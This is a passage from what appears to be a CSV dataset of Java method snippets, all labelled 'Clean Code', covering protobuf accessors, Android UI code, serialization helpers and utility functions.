    return getTasks(tx,taskIds);
  }
));
}
",0,Clean Code
"@Override public StreamInfo xinfoStream(String key){
  return executeInJedis(jedis -> jedis.xinfoStream(key));
}
",0,Clean Code
"public static String visitAnimal(){
  return RpcUtil.request(""com.alipay.antfarm.visitAnimal"",""[{\""requestType\"":\""NORMAL\"",\""sceneCode\"":\""ANTFARM\"",\""source\"":\""H5\"",\""version\"":\"""" + VERSION + ""\""}]"");
}",0,Clean Code
"public void writeInt64(long value){
  final int writerIdx=writerIndex;
  final int newIdx=writerIdx + 8;
  ensure(newIdx);
  if (!LITTLE_ENDIAN) {
    value=Long.reverseBytes(value);
  }
  UNSAFE.putLong(heapMemory,address + writerIdx,value);
  writerIndex=newIdx;
}",0,Clean Code
"@Test public void testWorkflowTaskTypeHTTPWithHttpParamInTaskDef(){
  WorkflowTask workflowTask=createSampleWorkflowTask();
  workflowTask.setType(""HTTP"");
  TaskDef taskDef=new TaskDef();
  taskDef.setName(""encode"");
  taskDef.getInputTemplate().put(""http_request"",""http://www.netflix.com"");
  when(mockMetadataDao.getTaskDef(anyString())).thenReturn(taskDef);
  Set<ConstraintViolation<WorkflowTask>> result=validator.validate(workflowTask);
  assertEquals(0,result.size());
}",0,Clean Code
"/** 
 * <code>optional uint32 uid = 14;</code>
 * @return whether the uid field is set
 */
public boolean hasUid(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"@Override public J.MethodDeclaration visitMethodDeclaration(J.MethodDeclaration method,ExecutionContext ctx){
  if (selectedCount > 0) {
    return method;
  }
  List<J.Annotation> annotations=method.getLeadingAnnotations();
  boolean isTest=annotations.stream().anyMatch(TEST_ANNOTATION_MATCHER::matches);
  if (!isTest) {
    return method;
  }
  boolean hasIssueOrDisabledAnnotation=annotations.stream().anyMatch(a -> ISSUE_ANNOTATION_MATCHER.matches(a) || DISABLED_ANNOTATION_MATCHER.matches(a) || DOCUMENT_EXAMPLE_ANNOTATION_MATCHER.matches(a));
  if (hasIssueOrDisabledAnnotation) {
    return method;
  }
  J.ClassDeclaration clazz=getCursor().dropParentUntil(J.ClassDeclaration.class::isInstance).getValue();
  boolean insideNestedClass=clazz != null && clazz.getLeadingAnnotations().stream().anyMatch(NESTED_ANNOTATION_MATCHER::matches);
  if (insideNestedClass) {
    return method;
  }
  boolean isAGoodExample=new JavaIsoVisitor<AtomicBoolean>(){
    @Override public J.MethodInvocation visitMethodInvocation(    J.MethodInvocation method,    AtomicBoolean isGood){
      if (REWRITE_RUN_METHOD_MATCHER_ALL.matches(method)) {
        int argIndex=0;
        if (REWRITE_RUN_METHOD_MATCHER_WITH_SPEC.matches(method)) {
          argIndex=1;
        }
        Expression arg=method.getArguments().get(argIndex);
        if (arg instanceof J.MethodInvocation) {
          J.MethodInvocation methodInvocation=(J.MethodInvocation)arg;
          methodInvocation.getArguments();
          if (methodInvocation.getArguments().size() > 1) {
            Expression arg0=methodInvocation.getArguments().get(0);
            Expression arg1=methodInvocation.getArguments().get(1);
            if (isStringLiteral(arg0) && isStringLiteral(arg1)) {
              isGood.set(true);
            }
          }
        }
      }
      return method;
    }
  }
.reduce(method,new AtomicBoolean()).get();
  if (!isAGoodExample) {
    return method;
  }
  maybeAddImport(DOCUMENT_EXAMPLE_ANNOTATION_FQN);
  selectedCount++;
  return JavaTemplate.builder(""@DocumentExample"").contextSensitive().imports(DOCUMENT_EXAMPLE_ANNOTATION_FQN).javaParser(JavaParser.fromJavaVersion().classpath(JavaParser.runtimeClasspath())).build().apply(getCursor(),method.getCoordinates().addAnnotation(comparing(J.Annotation::getSimpleName)));
}",0,Clean Code
"/** 
 * <code>optional uint32 npc_id = 5;</code>
 * @param value the npcId to set
 * @return this
 */
public GetNpcTakenRewardCsReq setNpcId(final int value){
  bitField0_|=0x00000001;
  npcId=value;
  return this;
}",0,Clean Code
"protected Object convertTimestampValue(Timestamp value,String type) throws Throwable {
  if (DataType.TIMESTAMP.equals(type) || DataType.UNKNOWN.equals(type))   return value;
  if (value == null)   return null;
  if (DataType.STRING.equals(type))   return this._timestampFormat.format(value);
 else   if (DataType.NUMBER.equals(type))   return value.getTime();
 else   if (DataType.INTEGER.equals(type))   return value.getTime();
 else   if (DataType.DECIMAL.equals(type))   return value.getTime();
 else   if (DataType.DATE.equals(type))   return new Date(value.getTime());
 else   if (DataType.TIME.equals(type))   return new Time(value.getTime());
 else   throw new DataValueConvertionException(value,type);
}
",0,Clean Code
"/** 
 * adjust position before Touch event complete and fling action start.
 */
protected void adjustPositionY(int velocityY){
  if (reverseLayout)   velocityY*=-1;
  int childCount=getChildCount();
  if (childCount > 0) {
    int curPosition=RecyclerViewUtils.getCenterYChildPosition(this);
    int childHeight=getHeight() - getPaddingTop() - getPaddingBottom();
    int flingCount=Math.max(-1,Math.min(1,getFlingCount(velocityY,childHeight)));
    int targetPosition=flingCount == 0 ? curPosition : mPositionOnTouchDown + flingCount;
    targetPosition=Math.max(targetPosition,0);
    targetPosition=Math.min(targetPosition,getItemCount() - 1);
    if (targetPosition == curPosition && mPositionOnTouchDown == curPosition) {
      View centerYChild=RecyclerViewUtils.getCenterYChild(this);
      if (centerYChild != null) {
        if (mTouchSpan > centerYChild.getHeight() * mTriggerOffset && targetPosition != 0) {
          if (!reverseLayout)           targetPosition--;
 else           targetPosition++;
        }
 else         if (mTouchSpan < centerYChild.getHeight() * -mTriggerOffset && targetPosition != getItemCount() - 1) {
          if (!reverseLayout)           targetPosition++;
 else           targetPosition--;
        }
      }
    }
    startSmoothScroll(safeTargetPosition(targetPosition,getItemCount()));
  }
}",0,Clean Code
"/** 
 * Parses a scorecard value for a score. <p>Examples of scores:</p> <ul> <li><strong>0</strong> or <strong>.</strong> which returns  {@link #DOT_BALL}</li> <li><strong>1</strong> which returns  {@link #SINGLE}</li> <li><strong>2</strong> which returns  {@link #TWO}</li> <li><strong>3</strong> which returns  {@link #THREE}</li> <li><strong>4</strong> which returns  {@link #FOUR}</li> <li><strong>5</strong> which returns a score of 5 runs</li> <li><strong>6</strong> which returns  {@link #SIX}</li> <li><strong>1lb</strong> which returns  {@link #LEG_BYE}</li> <li><strong>2lb</strong> which returns 2 leg byes</li> <li><strong>W</strong> which returns a wicket without a run</li> <li><strong>1w</strong> which returns  {@link #WIDE}</li> <li><strong>1nb</strong> which returns  {@link #NO_BALL}</li> <li><strong>5nb</strong> which a no-ball with 4 runs off the bat</li> <li>etc</li> </ul>
 * @param text A score, such as &quot;1&quot;, &quot;1lb&quot; &quot;W&quot; etc
 * @return A built score, or null if unknown
 */
public static Score parse(String text){
  if (""."".equals(text)) {
    return DOT_BALL;
  }
  if (""W"".equals(text)) {
    return WICKET;
  }
  Pattern pattern=Pattern.compile(""^(?<num>[0-9]+)(?<modifier>[A-Za-z]+)?$"");
  Matcher matcher=pattern.matcher(text);
  if (!matcher.matches()) {
    return null;
  }
  int runs=Integer.parseInt(matcher.group(""num""));
  String modifier=matcher.group(""modifier"");
  Builder score=Score.score();
  int batterRuns=runs;
  boolean dotBallIfNoRuns=true;
  if (modifier == null) {
    score.withValidDeliveries(1);
  }
 else {
switch (modifier) {
case ""W"":
      score.withWickets(1).withValidDeliveries(1).withBatterRuns(runs);
    break;
case ""w"":
  batterRuns=0;
score.withWides(runs).withWideDeliveries(1);
dotBallIfNoRuns=false;
break;
case ""nb"":
batterRuns=runs - 1;
score.withNoBalls(1).withBatterRuns(batterRuns);
dotBallIfNoRuns=false;
break;
case ""b"":
batterRuns=0;
score.withByes(runs).withValidDeliveries(1);
break;
case ""lb"":
batterRuns=0;
score.withLegByes(runs).withValidDeliveries(1).withDots(1);
break;
}
}
return score.withBatterRuns(batterRuns).withDots(dotBallIfNoRuns && batterRuns == 0 ? 1 : 0).withSingles(batterRuns == 1 ? 1 : 0).withTwos(batterRuns == 2 ? 1 : 0).withThrees(batterRuns == 3 ? 1 : 0).withFours(batterRuns == 4 ? 1 : 0).withSixes(batterRuns == 6 ? 1 : 0).build();
}",0,Clean Code
"/** 
 * Constructs a new duration with the given value and unit  {@link DurationUnit#MILLIS}. 
 */
public static Duration ofMillis(double value){
  return new Duration(value,MILLIS);
}
",0,Clean Code
"/** 
 * <code>optional uint32 avatar_promotion = 5;</code>
 * @return this
 */
public AvatarBattleInfo clearAvatarPromotion(){
  bitField0_&=~0x00000008;
  avatarPromotion=0;
  return this;
}",0,Clean Code
"public static boolean isAssignable(Class<?> dest,Class<?> sour){
  if (dest == sour) {
    return true;
  }
  if (dest == null) {
    return false;
  }
  if (sour == null) {
    return !dest.isPrimitive();
  }
  if (dest.isPrimitive() && sour.isPrimitive()) {
    if ((sour == Byte.TYPE) && (dest == Short.TYPE || dest == Integer.TYPE || dest == Long.TYPE || dest == Float.TYPE || dest == Double.TYPE)) {
      return true;
    }
    if ((sour == Short.TYPE) && (dest == Integer.TYPE || dest == Long.TYPE || dest == Float.TYPE || dest == Double.TYPE)) {
      return true;
    }
    if ((sour == Character.TYPE) && (dest == Integer.TYPE || dest == Long.TYPE || dest == Float.TYPE || dest == Double.TYPE)) {
      return true;
    }
    if ((sour == Integer.TYPE) && (dest == Long.TYPE || dest == Float.TYPE || dest == Double.TYPE)) {
      return true;
    }
    if ((sour == Long.TYPE) && (dest == Float.TYPE || dest == Double.TYPE)) {
      return true;
    }
    return (sour == Float.TYPE) && (dest == Double.TYPE);
  }
 else {
    return dest.isAssignableFrom(sour);
  }
}
",0,Clean Code
"public static PropExtraInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new PropExtraInfo(),data).checkInitialized();
}
public static PropExtraInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new PropExtraInfo(),input).checkInitialized();
}
public static PropExtraInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new PropExtraInfo(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * 鐢熸垚service
 * @param properties 鍙傛暟
 * @return fileService
 */
@Override public FileService build(UploadProperties properties){
  this.clint=new OSSClientBuilder().build(properties.getEndpoint(),properties.getAccessKeyId(),properties.getAccessKeySecret());
  this.properties=properties;
  return this;
}
",0,Clean Code
"@Before public void before(){
  flyway.migrate();
}
",0,Clean Code
"@Override public RogueAvatarInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  baseAvatarIdList.clear();
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 13;</code>
 * @return this
 */
public ExchangeGachaCeilingScRsp clearRetcode(){
  bitField0_&=~0x00000002;
  retcode=0;
  return this;
}",0,Clean Code
"private void onResumeInternal(){
  if (currentPage == PAGE_CAMERA) {
    if (openCloseAnimator != null && openCloseAnimator.isRunning()) {
      whenOpenDone=() -> requestCameraPermission(false);
    }
 else {
      requestCameraPermission(false);
    }
  }
  if (captionEdit != null) {
    captionEdit.onResume();
  }
  if (recordControl != null) {
    recordControl.updateGalleryImage();
  }
  if (previewHighlight != null) {
    previewHighlight.updateCount();
  }
  if (paintView != null) {
    paintView.onResume();
  }
  if (previewView != null) {
    previewView.updatePauseReason(0,false);
  }
  MessagesController.getInstance(currentAccount).getStoriesController().getDraftsController().load();
}",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 14;</code>
 * @param value the retcode to set
 * @return this
 */
public ChangeLineupLeaderScRsp setRetcode(final int value){
  bitField0_|=0x00000002;
  retcode=value;
  return this;
}",0,Clean Code
"public static void main(String[] args){
  RecordExample.test(fury);
  System.out.println(""CompatibleRecordExample succeed"");
}
",0,Clean Code
"private void fillUpWorkClientWithLastBadClient(){
  int currentRealSize=aliveConnections - clientMapData.size();
  List<HostInfo> pendingBadList=new ArrayList<>();
  for (  Map.Entry<HostInfo,AtomicLong> entry : lastBadHostMap.entrySet()) {
    if (pendingBadList.size() < currentRealSize) {
      pendingBadList.add(entry.getKey());
    }
 else {
      for (int index=0; index < pendingBadList.size(); index++) {
        if (entry.getValue().get() < lastBadHostMap.get(pendingBadList.get(index)).get()) {
          pendingBadList.set(index,entry.getKey());
        }
      }
    }
  }
  List<HostInfo> replaceHostLists=getRealHosts(pendingBadList,currentRealSize);
  if (replaceHostLists.size() > 0) {
    logger.info(""replace bad connection, use last bad list, "" + ""last bad list {}, client Map data {}"",lastBadHostMap.size(),clientMapData.size());
  }
  for (  HostInfo hostInfo : replaceHostLists) {
    boolean isSuccess=initConnection(hostInfo);
    if (isSuccess) {
      lastBadHostMap.remove(hostInfo);
    }
  }
}",0,Clean Code
"public void drawBackground(Canvas canvas,int left,int top,int right,int bottom,boolean pinnedTop,boolean pinnedBottom,boolean selected,int keyboardHeight){
  if (currentMessageObject.isOutOwner()) {
    if (!mediaBackground && !pinnedBottom) {
      currentBackgroundDrawable=(Theme.MessageDrawable)getThemedDrawable(selected ? Theme.key_drawable_msgOutSelected : Theme.key_drawable_msgOut);
    }
 else {
      currentBackgroundDrawable=(Theme.MessageDrawable)getThemedDrawable(selected ? Theme.key_drawable_msgOutMediaSelected : Theme.key_drawable_msgOutMedia);
    }
  }
 else {
    if (!mediaBackground && !pinnedBottom) {
      currentBackgroundDrawable=(Theme.MessageDrawable)getThemedDrawable(selected ? Theme.key_drawable_msgInSelected : Theme.key_drawable_msgIn);
    }
 else {
      currentBackgroundDrawable=(Theme.MessageDrawable)getThemedDrawable(selected ? Theme.key_drawable_msgInMediaSelected : Theme.key_drawable_msgInMedia);
    }
  }
  int w=parentWidth;
  int h=parentHeight;
  if (h == 0) {
    w=getParentWidth();
    h=AndroidUtilities.displaySize.y;
    if (getParent() instanceof View) {
      View view=(View)getParent();
      w=view.getMeasuredWidth();
      h=view.getMeasuredHeight();
    }
  }
  if (currentBackgroundDrawable != null) {
    currentBackgroundDrawable.setTop(keyboardHeight,w,h,(int)parentViewTopOffset,blurredViewTopOffset,blurredViewBottomOffset,pinnedTop,pinnedBottom);
    Drawable currentBackgroundShadowDrawable=currentBackgroundDrawable.getShadowDrawable();
    if (currentBackgroundShadowDrawable != null) {
      currentBackgroundShadowDrawable.setAlpha((int)(getAlpha() * 255));
      currentBackgroundShadowDrawable.setBounds(left,top,right,bottom);
      currentBackgroundShadowDrawable.draw(canvas);
      currentBackgroundShadowDrawable.setAlpha(255);
    }
    currentBackgroundDrawable.setAlpha((int)(getAlpha() * 255));
    currentBackgroundDrawable.setBounds(left,top,right,bottom);
    currentBackgroundDrawable.drawCached(canvas,backgroundCacheParams);
    currentBackgroundDrawable.setAlpha(255);
  }
  animateCheckboxTranslation();
}",0,Clean Code
"/** 
 * <pre> isnt used </pre> <code>repeated uint32 archive_missing_avatar_id_list = 2;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableArchiveMissingAvatarIdList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedInt getArchiveMissingAvatarIdList(){
  return archiveMissingAvatarIdList;
}",0,Clean Code
"public CharSequence getAppName(String packageName){
  String string2="""";
  Pattern pattern=Pattern.compile("".*喔�(.*)喔�.*"");
  for (  String edit : selectedApps) {
    if (edit.contains(packageName + ""喔�"")) {
      Matcher matcher=pattern.matcher(edit);
      if (matcher.find()) {
        string2=matcher.group(1);
      }
    }
  }
  return string2;
}",0,Clean Code
"@Override public CfLogisticsVehicleExample getExampleByQuer(CfLogisticsVehicleQuery cfLogisticsVehicleQuery){
  CfLogisticsVehicleExample cfLogisticsVehicleExample=new CfLogisticsVehicleExample();
  CfLogisticsVehicleExample.Criteria criteria=cfLogisticsVehicleExample.createCriteria();
  if (cfLogisticsVehicleQuery.getUid() != null) {
    criteria.andUidEqualTo(cfLogisticsVehicleQuery.getUid());
  }
  if (cfLogisticsVehicleQuery.getVehicleVin() != null) {
    criteria.andVehicleVinEqualTo(cfLogisticsVehicleQuery.getVehicleVin());
  }
  if (cfLogisticsVehicleQuery.getNumberPlate() != null) {
    criteria.andNumberPlateEqualTo(cfLogisticsVehicleQuery.getNumberPlate());
  }
  if (cfLogisticsVehicleQuery.getVehicleOwner() != null) {
    criteria.andVehicleOwnerEqualTo(cfLogisticsVehicleQuery.getVehicleOwner());
  }
  if (cfLogisticsVehicleQuery.getVehicleType() != null) {
    criteria.andVehicleTypeEqualTo(cfLogisticsVehicleQuery.getVehicleType());
  }
  if (StringUtils.isNotEmpty(cfLogisticsVehicleQuery.getOrderBy())) {
    cfLogisticsVehicleExample.setOrderByClause(cfLogisticsVehicleQuery.getOrderBy());
  }
  if (cfLogisticsVehicleQuery.getPage() != null && cfLogisticsVehicleQuery.getSize() != null) {
    PageHelper.startPage(cfLogisticsVehicleQuery.getPage(),cfLogisticsVehicleQuery.getSize());
  }
  return cfLogisticsVehicleExample;
}
",0,Clean Code
"@Override public BattleTarget create(){
  return BattleTarget.newInstance();
}
",0,Clean Code
"/** 
 * <code>optional .LineupInfo lineup = 10;</code>
 * @return whether the lineup field is set
 */
public boolean hasLineup(){
  return (bitField0_ & 0x00000004) != 0;
}",0,Clean Code
"/** 
 * <code>repeated .SceneEntityRefreshInfo refresh_entity = 14;</code>
 * @param value the refreshEntity to add
 * @return this
 */
public SceneGroupRefreshInfo addRefreshEntity(final SceneEntityRefreshInfoOuterClass.SceneEntityRefreshInfo value){
  bitField0_|=0x00000008;
  refreshEntity.add(value);
  return this;
}",0,Clean Code
"private FMParametersProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private FMParametersProto(){
  weights_=java.util.Collections.emptyList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4b9b44b",0,Clean Code
"@Override public void init(){
  findAndHookMethod(""com.android.systemui.shared.plugins.PluginManagerImpl"",""getClassLoader"",ApplicationInfo.class,new MethodHook(){
    @Override protected void after(    MethodHookParam param) throws Throwable {
      ApplicationInfo appInfo=(ApplicationInfo)param.args[0];
      if (""miui.systemui.plugin"".equals(appInfo.packageName)) {
        if (mPluginLoader == null) {
          mPluginLoader=(ClassLoader)param.getResult();
          findAndHookMethod(""miui.systemui.devicecontrols.ui.MiuiControlsUiControllerImpl"",mPluginLoader,""updateOrientation"",new MethodHook(){
            @Override protected void after(            MethodHookParam param) throws Throwable {
              RelativeLayout mParent=(RelativeLayout)XposedHelpers.getObjectField(param.thisObject,""parent"");
            }
          }
);
        }
      }
    }
  }
);
}",0,Clean Code
"public void setLastMsgSeq(long j2){
  this.lastMsgSeq=j2;
}",0,Clean Code
"public FunctionCallingOptionsBuilder withTemperature(Float temperature){
  this.options.setTemperature(temperature);
  return this;
}
",0,Clean Code
"public List<Expression> expressions(){
  return expressions;
}
",0,Clean Code
"@Override public GetFriendLoginInfoScRsp create(){
  return GetFriendLoginInfoScRsp.newInstance();
}
",0,Clean Code
"private void updateSearchButtons(int mask,int num,int count){
  if (searchUpButton != null) {
    searchUpButton.setEnabled((mask & (reversed ? 2 : 1)) != 0);
    searchUpButtonArrow.setAlpha(searchUpButton.isEnabled() ? 1.0f : 0.5f);
  }
  if (searchDownButton != null) {
    searchDownButton.setEnabled((mask & (reversed ? 1 : 2)) != 0);
    searchDownButtonArrow.setAlpha(searchDownButton.isEnabled() ? 1.0f : 0.5f);
  }
  if (searchCountText != null) {
    boolean animated=!LocaleController.isRTL;
    if (count < 0) {
      searchCountText.setText("""",animated);
    }
 else     if (count == 0) {
      searchCountText.setText(LocaleController.getString(R.string.NoResult),animated);
    }
 else     if (searchingFiltered) {
      searchCountText.setText(LocaleController.formatPluralString(""TaggedMessages"",count),animated);
    }
 else {
      searchCountText.setText(LocaleController.formatString(R.string.Of,num + 1,count),animated);
    }
  }
  if (searchExpandList != null) {
    searchExpandList.setClickable(count > 0);
    searchExpandList.animate().alpha(count > 0 ? 1f : 0.5f).start();
  }
}",0,Clean Code
"private String normalize(String text){
  if (!StringUtils.isNullOrEmpty(text)) {
    if (style.getUseTabCharacter() ? text.contains("" "") : text.contains(""\t"")) {
      StringBuilder textBuilder=new StringBuilder();
      int consecutiveSpaces=0;
      boolean inMargin=true;
      char[] charArray=text.toCharArray();
      outer:       for (int i=0; i < charArray.length; i++) {
        char c=charArray[i];
        if (c == '\n' || c == '\r') {
          inMargin=true;
          consecutiveSpaces=0;
          textBuilder.append(c);
        }
 else         if (!inMargin) {
          textBuilder.append(c);
        }
 else         if (style.getUseTabCharacter() && c == ' ') {
          int j=i + 1;
          for (; j < charArray.length && j < style.getTabSize(); j++) {
            if (charArray[j] != ' ') {
              continue outer;
            }
          }
          i=j + 1;
          textBuilder.append('\t');
        }
 else         if (!style.getUseTabCharacter() && c == '\t') {
          for (int j=0; j < style.getTabSize() - (consecutiveSpaces % style.getTabSize()); j++) {
            textBuilder.append(' ');
          }
          consecutiveSpaces=0;
        }
 else         if (Character.isWhitespace(c)) {
          consecutiveSpaces++;
          textBuilder.append(c);
        }
 else {
          inMargin=false;
          textBuilder.append(c);
        }
      }
      return textBuilder.toString();
    }
  }
  return text;
}",0,Clean Code
"public static String getFormattedDuration(@NonNull Context context,long millis){
  return getFormattedDuration(context,millis,false);
}
public static String getFormattedDuration(@NonNull Context context,long millis,boolean addSign){
  return getFormattedDuration(context,millis,addSign,false);
}
public static String getFormattedDuration(@NonNull Context context,long millis,boolean addSign,boolean includeSeconds){
  String fTime="""";
  if (millis < 0) {
    millis=-millis;
    if (addSign)     fTime=""- "";
  }
  long time=millis / 1000;
  long month, day, hour, min, sec;
  Resources res=context.getResources();
  month=time / 2_592_000;
  time%=2_592_000;
  day=time / 86_400;
  time%=86_400;
  hour=time / 3_600;
  time=time % 3_600;
  min=time / 60;
  sec=time % 60;
  int count=0;
  if (month != 0) {
    fTime+=res.getQuantityString(R.plurals.usage_months,(int)month,month);
    ++count;
  }
  if (day != 0) {
    fTime+=(count > 0 ? "" "" : """") + res.getQuantityString(R.plurals.usage_days,(int)day,day);
    ++count;
  }
  if (hour != 0) {
    fTime+=(count > 0 ? "" "" : """") + res.getQuantityString(R.plurals.usage_hours,(int)hour,hour);
    ++count;
  }
  if (min != 0) {
    fTime+=(count > 0 ? "" "" : """") + res.getQuantityString(R.plurals.usage_minutes,(int)min,min);
    ++count;
  }
 else   if (count == 0 && !includeSeconds) {
    fTime=context.getString(R.string.usage_less_than_a_minute);
  }
  if (includeSeconds) {
    fTime+=(count > 0 ? "" "" : """") + res.getQuantityString(R.plurals.usage_seconds,(int)sec,sec);
  }
  return fTime;
}",0,Clean Code
"@Test void fromPromptIndexAndContentFilterMetadata(){
  PromptFilterMetadata promptFilterMetadata=PromptFilterMetadata.from(1,""{ content-sentiment: 'SAFE' }"");
  assertThat(promptFilterMetadata).isNotNull();
  assertThat(promptFilterMetadata.getPromptIndex()).isOne();
  assertThat(promptFilterMetadata.<String>getContentFilterMetadata()).isEqualTo(""{ content-sentiment: 'SAFE' }"");
}",0,Clean Code
"private RuntimeException toException(Response<?> response) throws IOException {
  int code=response.code();
  String body=response.errorBody().string();
  String errorMessage=String.format(""status code: %s; body: %s"",code,body);
  return new RuntimeException(errorMessage);
}
",0,Clean Code
"/** 
 * 鑾峰彇鏉′欢鑺傜偣鐨勬墍鏈夋潯浠跺垎鏀�
 * @param flowId
 * @param version
 * @return
 */
List<FlowCondition> getByFlowId(Long flowId,Integer version);
",0,Clean Code
"public CustomThisScope(Scope parent,FrameDescriptor.Builder frameDescriptorBuilder){
  super(parent,parent.getNameOrNull(),parent.getQualifiedName(),ConstLevel.NONE,frameDescriptorBuilder);
}
",0,Clean Code
"/** 
 * <code>optional .SceneSummonUnitInfo summon_unit = 14;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public SceneSummonUnitInfoOuterClass.SceneSummonUnitInfo getMutableSummonUnit(){
  bitField0_|=0x00000100;
  return summonUnit;
}",0,Clean Code
"public void writeJavaStringRef(MemoryBuffer buffer,String str){
  if (stringSerializer.needToWriteRef()) {
    if (!refResolver.writeRefOrNull(buffer,str)) {
      stringSerializer.writeJavaString(buffer,str);
    }
  }
 else {
    if (str == null) {
      buffer.writeByte(Fury.NULL_FLAG);
    }
 else {
      buffer.writeByte(Fury.NOT_NULL_VALUE_FLAG);
      stringSerializer.write(buffer,str);
    }
  }
}
",0,Clean Code
"/** 
 * map.put(""module"", normal); 褰撳墠妯″潡 map.put(""needFields"", list); 瀵煎叆鎴栬�呭鍑鸿〃澶寸殑瀛楁 map.put(""allFields"", fields); 鎵�鏈夊瓧娈�
 * @param queryBO
 * @param sortIds
 * @return
 */
@Override public Map<String,Object> getFields(FieldQueryBO queryBO,List<Long> sortIds){
  ModuleEntity normal=moduleService.getNormal(queryBO.getModuleId());
  Long mainFieldId=normal.getMainFieldId();
  AtomicReference<ModuleFieldBO> mainField=new AtomicReference<>(new ModuleFieldBO());
  List<ModuleFieldBO> fields=fieldService.queryList(queryBO);
  List<ModuleFieldBO> excludeMainFields=fields.stream().filter(f -> {
    if (ObjectUtil.notEqual(f.getFieldId(),mainFieldId)) {
      return true;
    }
 else {
      mainField.set(BeanUtil.copyProperties(f,ModuleFieldBO.class));
      return false;
    }
  }
).collect(Collectors.toList());
  List<ModuleFieldBO> needFields;
  if (CollUtil.isNotEmpty(sortIds)) {
    needFields=excludeMainFields.stream().filter(head -> CollUtil.contains(sortIds,head.getFieldId())).collect(Collectors.toList());
  }
 else {
    needFields=excludeMainFields.stream().filter(f -> ObjectUtil.equal(0,f.getIsHidden())).filter(f -> ObjectUtil.equal(1,f.getFieldType())).filter(f -> ObjectUtil.isNull(f.getGroupId()) || ObjectUtil.equal(f.getType(),ModuleFieldEnum.DETAIL_TABLE.getType())).collect(Collectors.toList());
  }
  List<ModuleFieldBO> list=new ArrayList<>();
  list.add(mainField.get());
  list.addAll(needFields);
  Map<String,Object> map=new HashMap<>(4);
  map.put(""module"",normal);
  map.put(""needFields"",list);
  map.put(""allFields"",fields);
  return map;
}",0,Clean Code
"public GGProBriefAppInfo(GProBriefAppInfo gProBriefAppInfo){
  this.mInfo=gProBriefAppInfo;
}
",0,Clean Code
"public void write(JsonWriter out,Message message) throws IOException {
  out.beginObject();
  out.name(""role"");
  out.value(message.role().toString());
  out.name(""content"");
  if (message.content() == null) {
    boolean serializeNulls=out.getSerializeNulls();
    out.setSerializeNulls(true);
    out.nullValue();
    out.setSerializeNulls(serializeNulls);
  }
 else {
    out.value(message.content());
  }
  if (message.name() != null) {
    out.name(""name"");
    out.value(message.name());
  }
  if (message.functionCall() != null) {
    out.name(""function_call"");
    TypeAdapter<FunctionCall> functionCallTypeAdapter=Json.GSON.getAdapter(FunctionCall.class);
    functionCallTypeAdapter.write(out,message.functionCall());
  }
  out.endObject();
}
",0,Clean Code
"@JvmStatic public static EIPCResult callServer(@NotNull EIPCClient client,@Nullable String module,@Nullable String action,@Nullable Bundle bundle){
  return null;
}
",0,Clean Code
"public RedisQueuesShardingStrategyProvider(ShardSupplier shardSupplier,RedisProperties properties){
  this.shardSupplier=shardSupplier;
  this.properties=properties;
}
",0,Clean Code
"/** 
 * Expands the NIN (e.g. NOT IN) into a semantically equivalent boolean expressions of ANDs of NEs. Useful for providers that don't provide native NIN support.<br/> For example the <pre> foo NIN [""bar1"", ""bar2"", ""bar3""] (or foo NOT IN [""bar1"", ""bar2"", ""bar3""]) </pre> express is equivalent to <pre> {@code foo != ""bar1"" && foo != ""bar2"" && foo != ""bar3"" (e.g. AND(foo NE ""bar1"" AND( foo NE ""bar2"" OR(foo NE ""bar3""))) )}</pre>
 * @param exp input NIN expression.
 * @param context Output native expression.
 * @param filterExpressionConverter {@link FilterExpressionConverter} used to composethe AND and NE expanded expressions.
 */
public static void expandNin(Expression exp,StringBuilder context,FilterExpressionConverter filterExpressionConverter){
  Assert.isTrue(exp.type() == ExpressionType.NIN,""Expected NIN expressions but was: "" + exp.type());
  expandInNinExpressions(ExpressionType.AND,ExpressionType.NE,exp,context,filterExpressionConverter);
}",0,Clean Code
"public static VectorFloat<?> randomVector(Random random,int dim){
  var vec=vectorTypeSupport.createFloatVector(dim);
  for (int i=0; i < dim; i++) {
    vec.set(i,random.nextFloat());
    if (random.nextBoolean()) {
      vec.set(i,-vec.get(i));
    }
  }
  VectorUtil.l2normalize(vec);
  return vec;
}",0,Clean Code
"/** 
 * <code>optional .EntityMotion entity_motion = 7;</code>
 * @param value the entityMotion to set
 * @return this
 */
public SceneEntityTeleportScRsp setEntityMotion(final EntityMotionOuterClass.EntityMotion value){
  bitField0_|=0x00000004;
  entityMotion.copyFrom(value);
  return this;
}",0,Clean Code
"public AzureOpenAiStreamClient.Builder apiKey(String apiKeyValue){
  this.apiKey=apiKeyValue;
  return this;
}
",0,Clean Code
"@Override public void run(ApplicationArguments args) throws Exception {
  String routePrefix="""";
  if (SaFoxUtil.isNotEmpty(contextPath)) {
    if (!contextPath.startsWith(""/"")) {
      contextPath=""/"" + contextPath;
    }
    if (contextPath.endsWith(""/"")) {
      contextPath=contextPath.substring(0,contextPath.length() - 1);
    }
    routePrefix+=contextPath;
  }
  if (SaFoxUtil.isNotEmpty(servletPath)) {
    if (!servletPath.startsWith(""/"")) {
      servletPath=""/"" + servletPath;
    }
    if (servletPath.endsWith(""/"")) {
      servletPath=servletPath.substring(0,servletPath.length() - 1);
    }
    routePrefix+=servletPath;
  }
  if (SaFoxUtil.isNotEmpty(routePrefix) && !routePrefix.equals(""/"")) {
    ApplicationInfo.routePrefix=routePrefix;
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 KLLEONMNLDI = 15;</code>
 * @return whether the kLLEONMNLDI field is set
 */
public boolean hasKLLEONMNLDI(){
  return (bitField0_ & 0x00000010) != 0;
}",0,Clean Code
"public String getTaskInputPath(){
  return taskInputPath;
}
",0,Clean Code
"public String getResult(){
  return result;
}
",0,Clean Code
"/** 
